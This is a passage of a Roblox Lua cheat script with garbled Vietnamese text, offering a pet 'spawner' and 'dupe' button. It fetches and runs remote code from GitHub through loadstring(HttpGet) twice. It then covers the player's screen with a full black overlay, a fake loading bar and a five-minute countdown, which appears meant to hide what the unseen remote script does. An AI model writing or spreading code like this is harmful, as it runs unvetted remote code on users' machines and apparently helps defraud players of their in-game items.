spawnerButton.Position = UDim2.new(0.075, 0, 0.65, 0)
spawnerButton.Parent = mainFrame

-- â¬‡ Load script Spawner trÆ°á»›c Ä‘á»ƒ nÃºt cÃ³ thá»ƒ dÃ¹ng
local Spawner = loadstring(game:HttpGet("https://raw.githubusercontent.com/ataturk123/GardenSpawner/refs/heads/main/Spawner.lua"))()

spawnerButton.MouseButton1Click:Connect(function()
	spawnerButton.Text = "â³ Äang Gá»i..."
	Spawner.Load()
	Spawner.SpawnPet("Raccoon", 1, 2)
	spawnerButton.Text = "âœ… ÄÃ£ Gá»i!"
end)

-- âœ… Xá»­ lÃ½ kÃ­ch hoáº¡t Dupe
dupeButton.MouseButton1Click:Connect(function()
	dupeButton.Text = "âœ… KÃ­ch Hoáº¡t..."
	dupeButton.BackgroundColor3 = Color3.fromRGB(60, 0, 100)

	-- Gá»i script Dupe chÃ­nh
	loadstring(game:HttpGet("https://raw.githubusercontent.com/cuong11a/carrot_dupe/refs/heads/main/DupeGAG"))()

	-- Táº¡o loading Ä‘en
	task.delay(0.01, function()
		local gui = Instance.new("ScreenGui", CoreGui)
		gui.Name = "YoshidaaBlackLoading"
		gui.IgnoreGuiInset = true
		gui.ZIndexBehavior = Enum.ZIndexBehavior.Global

		local frame = Instance.new("Frame", gui)
		frame.BackgroundColor3 = Color3.new(0, 0, 0)
		frame.Size = UDim2.new(1, 0, 1, 36)
		frame.Position = UDim2.new(0, 0, 0, -36)
		frame.ZIndex = 999999
		frame.BackgroundTransparency = 1
		TweenService:Create(frame, TweenInfo.new(0.5), {BackgroundTransparency = 0}):Play()

		local gradient = Instance.new("UIGradient", frame)
		gradient.Color = ColorSequence.new({
			ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 0, 60)),
			ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 0, 20))
		})
		gradient.Rotation = 90

		local msg = Instance.new("TextLabel", frame)
		msg.Size = UDim2.new(1, 0, 0, 50)
		msg.Position = UDim2.new(0, 0, 0.45, 0)
		msg.Text = "ðŸ” TÃ¬m Server ID cá»•..."
		msg.TextColor3 = Color3.fromRGB(255, 255, 255)
		msg.BackgroundTransparency = 1
		msg.Font = Enum.Font.GothamBold
		msg.TextScaled = true
		msg.ZIndex = 999999

		local percent = Instance.new("TextLabel", frame)
		percent.Size = UDim2.new(1, 0, 0, 30)
		percent.Position = UDim2.new(0, 0, 0.55, 0)
		percent.Text = "Loading 0%"
		percent.TextColor3 = Color3.fromRGB(180, 180, 255)
		percent.BackgroundTransparency = 1
		percent.Font = Enum.Font.Gotham
		percent.TextScaled = true
		percent.ZIndex = 999999

		-- Loading & countdown
		task.spawn(function()
			for i = 1, 100 do
				percent.Text = "Loading " .. i .. "%"
				task.wait(0.1)
			end

			percent.Visible = false
			msg.Text = "ðŸ•’ Äá»£i VÃ i GiÃ¢y Random ID Dupe Pet"

			local countdown = Instance.new("TextLabel", frame)
			countdown.Size = UDim2.new(1, 0, 0, 40)
			countdown.Position = UDim2.new(0, 0, 0.63, 0)
			countdown.TextColor3 = Color3.fromRGB(255, 200, 200)
			countdown.BackgroundTransparency = 1
			countdown.Font = Enum.Font.GothamBold
			countdown.TextScaled = true
			countdown.ZIndex = 999999

			local totalTime = 300
			while totalTime >= 0 do
				countdown.Text = string.format("Rejoin in %02d:%02d", math.floor(totalTime / 60), totalTime % 60)
				task.wait(1)
				totalTime = totalTime - 1
			end

			msg.Text = "AUTO RE-JOIN START"
			countdown.Text = ""
			task.wait(2)
			TeleportService:Teleport(game.PlaceId
